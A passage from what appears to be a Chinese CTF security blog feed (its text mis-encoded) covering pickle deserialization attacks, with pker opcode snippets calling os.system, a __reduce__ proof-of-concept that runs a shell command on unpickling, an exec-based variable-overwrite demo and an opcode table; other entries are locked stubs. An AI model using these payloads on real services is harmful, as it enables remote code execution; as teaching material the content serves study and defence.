sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`è°ƒç”¨<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;i&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;c&#39;</code>ä¸<code>b&#39;o&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>å¤šå‚æ•°è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"><a href="#pkerï¼šå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"></a>pkerï¼šå®ä¾‹åŒ–å¯¹è±¡</h4><ul><li>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># æˆ–è€…</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="æ‰‹åŠ¨è¾…åŠ©"><a href="#æ‰‹åŠ¨è¾…åŠ©" class="headerlink" title="æ‰‹åŠ¨è¾…åŠ©"></a>æ‰‹åŠ¨è¾…åŠ©</h4><ul><li>æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„<code>.</code>å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚</li><li>å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚</li></ul><p>å‚è€ƒï¼š <a href="https://xz.aliyun.com/news/6608">https://xz.aliyun.com/news/6608</a> </p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XpathæŒ‡åŒ—</title>
    <link href="/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xpathæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxeæŒ‡åŒ—</title>
    <link href="/2025/01/26/xxe%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/xxe%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b53c19b66ca7debee8ec846570c8462fc5f8413e74213acfa13f2ad86b878447">7389a4e37e9dabc8af72228f567f583bef62c9a4a6fdd6cca750ba72693957ded54d803a165f2834f6fb605cb5bf53cd55f2c9f326d2060d29085156d8630dbbbd17cc0b36776df8c21697c186dec117d86b615424e5d8d27b98505c3dc070d40c7c97ee1744f7ae77e897f68553e4b680e87e79dab8dd5317b009378a9d14c54f1d66ebd940ea89d8d7e1bd3e0e0fb8ca22942ea8f480b37ae62e807c01ad9a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xssæŒ‡åŒ—</title>
    <link href="/2025/01/26/xss%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/xss%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MongDBæ³¨å…¥æŒ‡åŒ—</title>
    <link href="/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MangDBæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickleååºåˆ—åŒ–</title>
    <link href="/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯pickle"><a href="#ä»€ä¹ˆæ˜¯pickle" class="headerlink" title="ä»€ä¹ˆæ˜¯pickle"></a>ä»€ä¹ˆæ˜¯pickle</h1><ul><li><p>pickleå®é™…ä¸Šæ˜¯ä¸€é—¨æ ˆè¯­è¨€</p></li><li><p>ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…</p></li><li><p>ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚</p></li><li><p>pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§<strong>ç‹¬ç«‹çš„è¯­è¨€</strong>ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚</p></li></ul><h2 id="å¯åºåˆ—åŒ–çš„å¯¹è±¡"><a href="#å¯åºåˆ—åŒ–çš„å¯¹è±¡" class="headerlink" title="å¯åºåˆ—åŒ–çš„å¯¹è±¡"></a>å¯åºåˆ—åŒ–çš„å¯¹è±¡</h2><ul><li><code>None</code> ã€ <code>True</code> å’Œ <code>False</code></li><li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°</li><li>strã€byteã€bytearray</li><li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»</li><li><code>__dict__</code> å±æ€§å€¼æˆ– <code>__getstate__()</code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰</li></ul><h2 id="object-reduce-å‡½æ•°"><a href="#object-reduce-å‡½æ•°" class="headerlink" title="object.__reduce__() å‡½æ•°"></a><code>object.__reduce__()</code> å‡½æ•°</h2><ul><li>åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ <code>object.__reduce__()</code> å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ <code>object.__reduce__()</code> è¿”å›ä¸€ä¸ª <code>(callable, ([para1,para2...])[,...])</code> çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ <code>R</code> çš„ä½œç”¨ä¸ <code>object.__reduce__()</code> å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® <code>R</code> æ­£å¥½å¯¹åº” <code>object.__reduce__()</code> å‡½æ•°ï¼Œ <code>object.__reduce__()</code> çš„è¿”å›å€¼ä¼šä½œä¸º <code>R</code> çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† <code>R</code> çš„ã€‚</li></ul><h1 id="pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»"><a href="#pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»" class="headerlink" title="pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»"></a>pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»</h1><ul><li>pickleè§£æä¾é Pickle Virtual Machine (PVM)è¿›è¡Œã€‚</li><li>PVMæ¶‰åŠåˆ°ä¸‰ä¸ªéƒ¨åˆ†ï¼š1. è§£æå¼•æ“ 2. æ ˆ 3. å†…å­˜ï¼š</li><li>è§£æå¼•æ“ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° <code>.</code> åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li><li>æ ˆï¼šç”±Pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li><li>memoï¼šç”±Pythonçš„dictå®ç°ï¼Œä¸ºPVMçš„ç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚è¯´äººè¯ï¼šå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥ <code>key-value</code> çš„å½¢å¼å‚¨å­˜åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚</li><li>PVMè§£æ <code>str</code> çš„è¿‡ç¨‹åŠ¨å›¾ï¼š</li></ul><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230631-6204866e-6abc-1.gif" alt="img"></p><ul><li><p>PVMè§£æ <code>__reduce__()</code> çš„è¿‡ç¨‹åŠ¨å›¾ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p></li></ul><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>pickle EXPçš„ç®€å•demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># æ­¤æ—¶ï¼Œå¦‚æœ pickle.loads(poc)ï¼Œå°±ä¼šæ‰§è¡Œå‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2) <span class="hljs-comment">#è¦†ç›–</span><br></code></pre></td></tr></table></figure><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><ul><li>åœ¨CTFä¸­ï¼Œå¾ˆå¤šæ—¶å€™éœ€è¦ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‡½æ•°æˆ–ä¸€æ¬¡è¿›è¡Œå¤šä¸ªæŒ‡ä»¤ï¼Œæ­¤æ—¶å°±ä¸èƒ½å…‰ç”¨ <code>__reduce__</code> æ¥è§£å†³é—®é¢˜ï¼ˆreduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œå½“execè¢«ç¦ç”¨æ—¶ï¼Œå°±ä¸èƒ½ä¸€æ¬¡æ‰§è¡Œå¤šæ¡æŒ‡ä»¤äº†ï¼‰ï¼Œè€Œéœ€è¦æ‰‹åŠ¨æ‹¼æ¥æˆ–æ„é€ opcodeäº†ã€‚æ‰‹å†™opcodeæ˜¯pickleååºåˆ—åŒ–æ¯”è¾ƒéš¾çš„åœ°æ–¹ã€‚</li><li>åœ¨è¿™é‡Œå¯ä»¥ä½“ä¼šåˆ°ä¸ºä½•pickle<strong>æ˜¯ä¸€ç§è¯­è¨€</strong>ï¼Œç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œåªè¦ç¬¦åˆpickleè¯­æ³•ï¼Œå°±å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œç­‰æ“ä½œã€‚</li><li>æ ¹æ®å‰æ–‡ä¸åŒç‰ˆæœ¬çš„opcodeå¯ä»¥çœ‹å‡ºï¼Œç‰ˆæœ¬0çš„opcodeæ›´æ–¹ä¾¿é˜…è¯»ï¼Œæ‰€ä»¥æ‰‹åŠ¨ç¼–å†™æ—¶ï¼Œä¸€èˆ¬é€‰ç”¨ç‰ˆæœ¬0çš„opcodeã€‚ä¸‹æ–‡ä¸­ï¼Œæ‰€æœ‰opcodeä¸ºç‰ˆæœ¬0çš„opcode</li></ul><h2 id="å¸¸ç”¨opcodeè§£æ"><a href="#å¸¸ç”¨opcodeè§£æ" class="headerlink" title="å¸¸ç”¨opcodeè§£æ"></a>å¸¸ç”¨opcodeè§£æ</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><p>å¸¸ç”¨çš„opcodeå¦‚ä¸‹ï¼šå®Œæ•´çš„å¯åœ¨<code>$PYTHON/Lib/pickle.py</code>æŸ¥çœ‹</p><table><thead><tr><th>opcode</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th><th>memoä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>R</td><td>é€‰æ‹©æ 